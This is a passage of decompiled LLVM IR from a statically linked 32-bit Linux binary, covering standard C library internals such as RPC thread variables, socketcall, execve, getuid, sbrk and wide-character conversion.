  br i1 %v1_8060e71, label %dec_label_pc_8060e95, label %dec_label_pc_8060e75

dec_label_pc_8060e75:                             ; preds = %dec_label_pc_8060e5e
  %v4_8060e83 = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v5_8060e67, i32 134587095, i32 134587095)
  %v0_8060eb4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060eb4

dec_label_pc_8060e95:                             ; preds = %dec_label_pc_8060e5e
  %v1_8060ea3 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8060ea3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060eb4

dec_label_pc_8060eb4:                             ; preds = %dec_label_pc_8060e04, %entry, %dec_label_pc_8060e75, %dec_label_pc_8060e95
  %v0_8060eb4 = phi i32 [ %v1_8060e49, %dec_label_pc_8060e04 ], [ %v1_8060deb, %entry ], [ %v0_8060eb4.pre, %dec_label_pc_8060e75 ], [ %v1_8060ea3, %dec_label_pc_8060e95 ]
  %v2_8060eb6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8060eb6, i32* @edx, align 4
  store i32 %v0_8060dd9, i32* @ebx, align 4
  ret i32 %v0_8060eb4

; uselistorder directives
  uselistorder i32 %v5_8060e67, { 0, 2, 1 }
  uselistorder i32 %v1_8060e49, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8060deb, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8060eb4, { 3, 2, 0, 1 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  %v1_8060ebd = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8060ec7 = icmp eq i32 %v1_8060ebd, 134730080
  br i1 %v6_8060ec7, label %dec_label_pc_8060ed4, label %dec_label_pc_8060ece

dec_label_pc_8060ece:                             ; preds = %entry
  %v1_8060ece = add i32 %v1_8060ebd, 148
  br label %dec_label_pc_8060ed4

dec_label_pc_8060ed4:                             ; preds = %entry, %dec_label_pc_8060ece
  %v0_8060ed4 = phi i32 [ ptrtoint (i32* @global_var_807ea2c.779 to i32), %entry ], [ %v1_8060ece, %dec_label_pc_8060ece ]
  ret i32 %v0_8060ed4

; uselistorder directives
  uselistorder i32 %v1_8060ebd, { 1, 0 }
  uselistorder label %dec_label_pc_8060ed4, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  %v1_8060edd = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8060ee7 = icmp eq i32 %v1_8060edd, 134730080
  br i1 %v6_8060ee7, label %dec_label_pc_8060ef4, label %dec_label_pc_8060eee

dec_label_pc_8060eee:                             ; preds = %entry
  %v1_8060eee = add i32 %v1_8060edd, 144
  br label %dec_label_pc_8060ef4

dec_label_pc_8060ef4:                             ; preds = %entry, %dec_label_pc_8060eee
  %v0_8060ef4 = phi i32 [ ptrtoint (i32* @global_var_807ea40.780 to i32), %entry ], [ %v1_8060eee, %dec_label_pc_8060eee ]
  ret i32 %v0_8060ef4

; uselistorder directives
  uselistorder i32 %v1_8060edd, { 1, 0 }
  uselistorder label %dec_label_pc_8060ef4, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %v1_8060efd = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8060f07 = icmp eq i32 %v1_8060efd, 134730080
  br i1 %v6_8060f07, label %dec_label_pc_8060f14, label %dec_label_pc_8060f0e

dec_label_pc_8060f0e:                             ; preds = %entry
  %v1_8060f0e = add i32 %v1_8060efd, 128
  br label %dec_label_pc_8060f14

dec_label_pc_8060f14:                             ; preds = %entry, %dec_label_pc_8060f0e
  %storemerge = phi i32 [ %v1_8060f0e, %dec_label_pc_8060f0e ], [ ptrtoint (i32* @global_var_807ea30.781 to i32), %entry ]
  %v0_8060f14 = phi i32 [ %v1_8060f0e, %dec_label_pc_8060f0e ], [ ptrtoint (i32* @global_var_807ea30.781 to i32), %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8060f14

; uselistorder directives
  uselistorder i32 %v1_8060efd, { 1, 0 }
  uselistorder label %dec_label_pc_8060f14, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset() local_unnamed_addr {
entry:
  %v1_8060f1d = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8060f27 = icmp eq i32 %v1_8060f1d, 134730080
  br i1 %v6_8060f27, label %dec_label_pc_8060f30, label %dec_label_pc_8060f2e

dec_label_pc_8060f2e:                             ; preds = %entry
  br label %dec_label_pc_8060f30

dec_label_pc_8060f30:                             ; preds = %entry, %dec_label_pc_8060f2e
  %v0_8060f30 = phi i32 [ ptrtoint (i32* @global_var_807e9a0.782 to i32), %entry ], [ %v1_8060f1d, %dec_label_pc_8060f2e ]
  ret i32 %v0_8060f30

; uselistorder directives
  uselistorder i32 %v1_8060f1d, { 1, 0 }
  uselistorder label %dec_label_pc_8060f30, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v1_8060f48 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8060f48, i32* @ebx, align 4
  %v1_8060f5a = icmp eq i32 %v1_8060f48, 0
  br i1 %v1_8060f5a, label %dec_label_pc_8060ff0, label %dec_label_pc_8060f62

dec_label_pc_8060f62:                             ; preds = %entry
  %v6_8060f62 = icmp eq i32 %v1_8060f48, 134730080
  br i1 %v6_8060f62, label %dec_label_pc_8060ff0, label %dec_label_pc_8060f6e

dec_label_pc_8060f6e:                             ; preds = %dec_label_pc_8060f62
  %v0_8060f6e = call i32 @__rpc_thread_svc_cleanup()
  %v0_8060f73 = call i32 @__rpc_thread_clnt_cleanup()
  %v0_8060f7b = load i32, i32* @ebx, align 4
  %v1_8060f7b = add i32 %v0_8060f7b, 152
  %v2_8060f7b = inttoptr i32 %v1_8060f7b to i32*
  %v3_8060f7b = load i32, i32* %v2_8060f7b, align 4
  %v1_8060f81 = call i32 @free(i32 %v3_8060f7b)
  %v0_8060f87 = load i32, i32* @ebx, align 4
  %v1_8060f87 = add i32 %v0_8060f87, 156
  %v2_8060f87 = inttoptr i32 %v1_8060f87 to i32*
  %v3_8060f87 = load i32, i32* %v2_8060f87, align 4
  %v1_8060f8d = call i32 @free(i32 %v3_8060f87)
  %v0_8060f93 = load i32, i32* @ebx, align 4
  %v1_8060f93 = add i32 %v0_8060f93, 160
  %v2_8060f93 = inttoptr i32 %v1_8060f93 to i32*
  %v3_8060f93 = load i32, i32* %v2_8060f93, align 4
  %v1_8060f99 = call i32 @free(i32 %v3_8060f93)
  %v0_8060f9f = load i32, i32* @ebx, align 4
  %v1_8060f9f = add i32 %v0_8060f9f, 188
  %v2_8060f9f = inttoptr i32 %v1_8060f9f to i32*
  %v3_8060f9f = load i32, i32* %v2_8060f9f, align 4
  %v1_8060fa5 = call i32 @free(i32 %v3_8060f9f)
  %v0_8060fab = load i32, i32* @ebx, align 4
  %v1_8060fab = add i32 %v0_8060fab, 172
  %v2_8060fab = inttoptr i32 %v1_8060fab to i32*
  %v3_8060fab = load i32, i32* %v2_8060fab, align 4
  %v1_8060fb1 = call i32 @free(i32 %v3_8060fab)
  %v0_8060fb7 = load i32, i32* @ebx, align 4
  %v1_8060fb7 = add i32 %v0_8060fb7, 176
  %v2_8060fb7 = inttoptr i32 %v1_8060fb7 to i32*
  %v3_8060fb7 = load i32, i32* %v2_8060fb7, align 4
  %v1_8060fbd = call i32 @free(i32 %v3_8060fb7)
  %v0_8060fc2 = load i32, i32* @ebx, align 4
  %v1_8060fc5 = call i32 @free(i32 %v0_8060fc2)
  %v0_8060fd6 = load i32, i32* @ecx, align 4
  %v4_8060fdc = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 %v0_8060fd6, i32 %v0_8060fd6)
  br label %dec_label_pc_8060ff0

dec_label_pc_8060ff0:                             ; preds = %dec_label_pc_8060f62, %entry, %dec_label_pc_8060f6e
  %v2_8060ff0 = load i32, i32* %stack_var_-12, align 4
  ret i32 %v2_8060ff0

; uselistorder directives
  uselistorder i32 %v1_8060f48, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i32 188, { 2, 0, 1 }
  uselistorder i32 (i32)* @__pthread_internal_tsd_get, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8060ff0, { 2, 0, 1 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v1_8060ffb = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v0_8061000 = load i32, i32* @edx, align 4
  %v2_8061000 = inttoptr i32 %v1_8060ffb to i32*
  store i32 %v0_8061000, i32* %v2_8061000, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v1_8061014 = add i32 %tmp2, 20
  %v2_8061014 = inttoptr i32 %v1_8061014 to i32*
  %v3_8061014 = load i32, i32* %v2_8061014, align 4
  call void @__pseudo_branch(i32 %v3_8061014)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ecx, align 4
  %v0_806102e = call i32 @vfork()
  %v5_8061031 = icmp ult i32 %v0_806102e, -4095
  %v1_8061036 = icmp eq i1 %v5_8061031, false
  call void @__pseudo_cond_branch(i1 %v1_8061036, i32 134615028)
  ret i32 %v0_806102e
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061040 = load i32, i32* @ebx, align 4
  store i32 %v0_8061040, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8061053 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8061053, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061053, -4095
  br i1 %tmp, label %dec_label_pc_806106c, label %dec_label_pc_8061060

dec_label_pc_8061060:                             ; preds = %entry
  %v0_8061060 = load i32, i32* %stack_var_-4, align 4
  %v1_8061060 = call i32 @__errno_location(i32 %v0_8061060)
  %v0_8061065 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061065 = sub i32 0, %v0_8061065
  %v2_8061067 = inttoptr i32 %v1_8061060 to i32*
  store i32 %v1_8061065, i32* %v2_8061067, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806106c

dec_label_pc_806106c:                             ; preds = %entry, %dec_label_pc_8061060
  %v0_806106c = phi i32 [ %v1_8061053, %entry ], [ -1, %dec_label_pc_8061060 ]
  %v2_806106e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806106e, i32* @edx, align 4
  %v2_8061070 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061070, i32* @ebx, align 4
  ret i32 %v0_806106c

; uselistorder directives
  uselistorder i32 %v1_8061053, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806106c, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061074 = load i32, i32* @ebx, align 4
  store i32 %v0_8061074, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8061087 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8061087, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8061087, -4095
  br i1 %tmp, label %dec_label_pc_80610a0, label %dec_label_pc_8061094

dec_label_pc_8061094:                             ; preds = %entry
  %v0_8061094 = load i32, i32* %stack_var_-4, align 4
  %v1_8061094 = call i32 @__errno_location(i32 %v0_8061094)
  %v0_8061099 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061099 = sub i32 0, %v0_8061099
  %v2_806109b = inttoptr i32 %v1_8061094 to i32*
  store i32 %v1_8061099, i32* %v2_806109b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80610a0

dec_label_pc_80610a0:                             ; preds = %entry, %dec_label_pc_8061094
  %v0_80610a0 = phi i32 [ %v4_8061087, %entry ], [ -1, %dec_label_pc_8061094 ]
  %v2_80610a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80610a4, i32* @ebx, align 4
  ret i32 %v0_80610a0

; uselistorder directives
  uselistorder i32 %v4_8061087, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80610a0, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80610a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80610a8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80610bb = call i32 @dup2(i32 %v0_80610a8, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80610bb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80610bb, -4095
  br i1 %tmp, label %dec_label_pc_80610d4, label %dec_label_pc_80610c8

dec_label_pc_80610c8:                             ; preds = %entry
  %v0_80610c8 = load i32, i32* %stack_var_-4, align 4
  %v1_80610c8 = call i32 @__errno_location(i32 %v0_80610c8)
  %v0_80610cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80610cd = sub i32 0, %v0_80610cd
  %v2_80610cf = inttoptr i32 %v1_80610c8 to i32*
  store i32 %v1_80610cd, i32* %v2_80610cf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80610d4

dec_label_pc_80610d4:                             ; preds = %entry, %dec_label_pc_80610c8
  %v0_80610d4 = phi i32 [ %v4_80610bb, %entry ], [ -1, %dec_label_pc_80610c8 ]
  %v2_80610d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80610d8, i32* @ebx, align 4
  ret i32 %v0_80610d4

; uselistorder directives
  uselistorder i32 %v4_80610bb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80610d4, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_3()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80610dc = load i32, i32* @edi, align 4
  store i32 %v0_80610dc, i32* %stack_var_-4, align 4
  %v4_80610e0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80610e0, i32* %edi.global-to-local, align 4
  %v0_80610ec = load i32, i32* @ebx, align 4
  %v5_80610f4 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80610f4 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80610f4 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80610f4, [1 x i8*] %v8_80610f4)
  store i32 %v9_80610f4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80610f4, -4095
  br i1 %tmp12, label %dec_label_pc_806110c, label %dec_label_pc_8061100

dec_label_pc_8061100:                             ; preds = %entry
  %v1_8061100 = call i32 @__errno_location(i32 %v0_80610ec)
  %v0_8061105 = load i32, i32* %edi.global-to-local, align 4
  %v1_8061105 = sub i32 0, %v0_8061105
  %v2_8061107 = inttoptr i32 %v1_8061100 to i32*
  store i32 %v1_8061105, i32* %v2_8061107, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_806110c

dec_label_pc_806110c:                             ; preds = %entry, %dec_label_pc_8061100
  %v0_806110c = phi i32 [ %v9_80610f4, %entry ], [ -1, %dec_label_pc_8061100 ]
  %v2_806110e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806110e, i32* @edx, align 4
  %v2_8061110 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061110, i32* %edi.global-to-local, align 4
  ret i32 %v0_806110c

; uselistorder directives
  uselistorder i32 %v9_80610f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806110c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061114 = load i32, i32* @ebx, align 4
  store i32 %v0_8061114, i32* %stack_var_-4, align 4
  %v1_806111d = call i32 @int80_syscall(i32 202)
  store i32 %v1_806111d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_806111d, -4095
  br i1 %tmp, label %dec_label_pc_8061134, label %dec_label_pc_8061128

dec_label_pc_8061128:                             ; preds = %entry
  %v0_8061128 = load i32, i32* %stack_var_-4, align 4
  %v1_8061128 = call i32 @__errno_location(i32 %v0_8061128)
  %v0_806112d = load i32, i32* %ebx.global-to-local, align 4
  %v1_806112d = sub i32 0, %v0_806112d
  %v2_806112f = inttoptr i32 %v1_8061128 to i32*
  store i32 %v1_806112d, i32* %v2_806112f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061134

dec_label_pc_8061134:                             ; preds = %entry, %dec_label_pc_8061128
  %v0_8061134 = phi i32 [ %v1_806111d, %entry ], [ -1, %dec_label_pc_8061128 ]
  %v2_8061138 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061138, i32* @ebx, align 4
  ret i32 %v0_8061134

; uselistorder directives
  uselistorder i32 %v1_806111d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061134, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806113c = load i32, i32* @ebx, align 4
  store i32 %v0_806113c, i32* %stack_var_-4, align 4
  %v1_8061145 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8061145, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061145, -4095
  br i1 %tmp, label %dec_label_pc_806115c, label %dec_label_pc_8061150

dec_label_pc_8061150:                             ; preds = %entry
  %v0_8061150 = load i32, i32* %stack_var_-4, align 4
  %v1_8061150 = call i32 @__errno_location(i32 %v0_8061150)
  %v0_8061155 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061155 = sub i32 0, %v0_8061155
  %v2_8061157 = inttoptr i32 %v1_8061150 to i32*
  store i32 %v1_8061155, i32* %v2_8061157, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806115c

dec_label_pc_806115c:                             ; preds = %entry, %dec_label_pc_8061150
  %v0_806115c = phi i32 [ %v1_8061145, %entry ], [ -1, %dec_label_pc_8061150 ]
  %v2_8061160 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061160, i32* %ebx.global-to-local, align 4
  ret i32 %v0_806115c

; uselistorder directives
  uselistorder i32 %v1_8061145, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806115c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061164 = load i32, i32* @ebx, align 4
  store i32 %v0_8061164, i32* %stack_var_-4, align 4
  %v1_806116d = call i32 @int80_syscall(i32 199)
  store i32 %v1_806116d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_806116d, -4095
  br i1 %tmp, label %dec_label_pc_8061184, label %dec_label_pc_8061178

dec_label_pc_8061178:                             ; preds = %entry
  %v0_8061178 = load i32, i32* %stack_var_-4, align 4
  %v1_8061178 = call i32 @__errno_location(i32 %v0_8061178)
  %v0_806117d = load i32, i32* %ebx.global-to-local, align 4
  %v1_806117d = sub i32 0, %v0_806117d
  %v2_806117f = inttoptr i32 %v1_8061178 to i32*
  store i32 %v1_806117d, i32* %v2_806117f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061184

dec_label_pc_8061184:                             ; preds = %entry, %dec_label_pc_8061178
  %v0_8061184 = phi i32 [ %v1_806116d, %entry ], [ -1, %dec_label_pc_8061178 ]
  %v2_8061188 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061188, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8061184

; uselistorder directives
  uselistorder i32 %v1_806116d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061184, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %v0_806118d = load i32, i32* @ebx, align 4
  %v0_8061191 = load i32, i32* @global_var_807d2a4.783, align 4
  %v1_8061191 = icmp eq i32 %v0_8061191, 0
  %v1_806119c = icmp eq i1 %v1_8061191, false
  br i1 %v1_806119c, label %dec_label_pc_80611af, label %dec_label_pc_806119e

dec_label_pc_806119e:                             ; preds = %entry
  %v1_80611a3 = call i32 @__GI_brk(i32 0)
  %v2_80611ab = icmp slt i32 %v1_80611a3, 0
  br i1 %v2_80611ab, label %dec_label_pc_80611d1, label %dec_label_pc_806119e.dec_label_pc_80611af_crit_edge

dec_label_pc_806119e.dec_label_pc_80611af_crit_edge: ; preds = %dec_label_pc_806119e
  %v0_80611b1.pre = load i32, i32* @global_var_807d2a4.783, align 4
  br label %dec_label_pc_80611af

dec_label_pc_80611af:                             ; preds = %dec_label_pc_806119e.dec_label_pc_80611af_crit_edge, %entry
  %v0_80611bf = phi i32 [ %v0_80611b1.pre, %dec_label_pc_806119e.dec_label_pc_80611af_crit_edge ], [ %v0_8061191, %entry ]
  %v1_80611af = icmp eq i32 %arg1, 0
  %v1_80611b6 = icmp eq i1 %v1_80611af, false
  br i1 %v1_80611b6, label %dec_label_pc_80611bc, label %dec_label_pc_80611b8

dec_label_pc_80611b8:                             ; preds = %dec_label_pc_80611af
  br label %dec_label_pc_80611d4

dec_label_pc_80611bc:                             ; preds = %dec_label_pc_80611af
  store i32 %v0_80611bf, i32* @ebx, align 4
  %v2_80611c1 = add i32 %v0_80611bf, %arg1
  %v1_80611c5 = call i32 @__GI_brk(i32 %v2_80611c1)
  %v2_80611cd = icmp slt i32 %v1_80611c5, 0
  %v1_80611cf = icmp eq i1 %v2_80611cd, false
  br i1 %v1_80611cf, label %dec_label_pc_80611bc.dec_label_pc_80611d4_crit_edge, label %dec_label_pc_80611d1

dec_label_pc_80611bc.dec_label_pc_80611d4_crit_edge: ; preds = %dec_label_pc_80611bc
  %v0_80611d4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80611d4

dec_label_pc_80611d1:                             ; preds = %dec_label_pc_80611bc, %dec_label_pc_806119e
  br label %dec_label_pc_80611d4

dec_label_pc_80611d4:                             ; preds = %dec_label_pc_80611bc.dec_label_pc_80611d4_crit_edge, %dec_label_pc_80611b8, %dec_label_pc_80611d1
  %v0_80611d4 = phi i32 [ %v0_80611d4.pre, %dec_label_pc_80611bc.dec_label_pc_80611d4_crit_edge ], [ %v0_80611bf, %dec_label_pc_80611b8 ], [ -1, %dec_label_pc_80611d1 ]
  store i32 %v0_806118d, i32* @ebx, align 4
  ret i32 %v0_80611d4

; uselistorder directives
  uselistorder i32 %v0_80611bf, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80611d4, { 2, 0, 1 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80611e0 = add i32 %arg1, 128
  %v6_80611eb = icmp ugt i32 %v1_80611e0, 383
  br i1 %v6_80611eb, label %dec_label_pc_80611f6, label %dec_label_pc_80611ed

dec_label_pc_80611ed:                             ; preds = %entry
  %v0_80611ed = load i32, i32* bitcast (i32** @global_var_8074868.713 to i32*), align 8
  %v2_80611f2 = mul i32 %arg1, 2
  %v3_80611f2 = add i32 %v0_80611ed, %v2_80611f2
  %v4_80611f2 = inttoptr i32 %v3_80611f2 to i16*
  %v5_80611f2 = load i16, i16* %v4_80611f2, align 2
  %v6_80611f2 = sext i16 %v5_80611f2 to i32
  store i32 %v6_80611f2, i32* @edx, align 4
  br label %dec_label_pc_80611f6

dec_label_pc_80611f6:                             ; preds = %entry, %dec_label_pc_80611ed
  %v0_80611f6 = phi i32 [ %arg1, %entry ], [ %v6_80611f2, %dec_label_pc_80611ed ]
  ret i32 %v0_80611f6

; uselistorder directives
  uselistorder label %dec_label_pc_80611f6, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_807aedc.662 to i32)

; uselistorder directives
  uselistorder i32* @global_var_807aedc.662, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_806120f = icmp eq i32 %tmp5, 0
  %v1_8061211 = icmp eq i1 %v1_806120f, false
  br i1 %v1_8061211, label %dec_label_pc_8061219, label %dec_label_pc_8061213

dec_label_pc_8061213:                             ; preds = %entry
  %v2_8061213 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8061219

dec_label_pc_8061219:                             ; preds = %entry, %dec_label_pc_8061213
  %v0_8061235 = phi i32 [ %tmp5, %entry ], [ %v2_8061213, %dec_label_pc_8061213 ]
  %v0_806121d = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_8061213 ]
  %v2_8061219 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_806121d, i32* %stack_var_-4, align 4
  store i32 %v2_8061219, i32* %stack_var_-8, align 4
  %v2_8061230 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8061236 = inttoptr i32 %v0_8061235 to i8*
  %v6_8061236 = call i32 @__GI_wcsnrtombs(i8* %v5_8061236, i32 %v2_8061230, i32 1, i32 16, i32 %tmp)
  %v1_806123e = icmp eq i32 %v6_8061236, 0
  %v1_8061240 = icmp eq i1 %v1_806123e, false
  br i1 %v1_8061240, label %dec_label_pc_8061244, label %dec_label_pc_8061242

dec_label_pc_8061242:                             ; preds = %dec_label_pc_8061219
  %v1_8061242 = and i32 %v6_8061236, -256
  %v2_8061242 = or i32 %v1_8061242, 1
  br label %dec_label_pc_8061244

dec_label_pc_8061244:                             ; preds = %dec_label_pc_8061219, %dec_label_pc_8061242
  %v0_8061247 = phi i32 [ %v6_8061236, %dec_label_pc_8061219 ], [ %v2_8061242, %dec_label_pc_8061242 ]
  ret i32 %v0_8061247

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8061244, { 1, 0 }
  uselistorder label %dec_label_pc_8061219, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_806125d = inttoptr i32 %tmp to i8*
  %v6_806125d = call i32 @__GI_wcsnrtombs(i8* %v5_806125d, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_806125d
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_806126b = load i32, i32* @ebx, align 4
  %v4_806126f = ptrtoint i8* %arg1 to i32
  store i32 %v4_806126f, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_806127b = icmp eq i8* %arg1, null
  br i1 %v1_806127b, label %dec_label_pc_806128a, label %dec_label_pc_806127f

dec_label_pc_806127f:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_8061284 = icmp eq i32 %v4_806126f, %arg2
  %v1_8061286 = icmp eq i1 %v12_8061284, false
  br i1 %v1_8061286, label %dec_label_pc_80612af, label %dec_label_pc_80612a9

dec_label_pc_806128a:                             ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_806128c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_806128c, i32* %edx.global-to-local, align 4
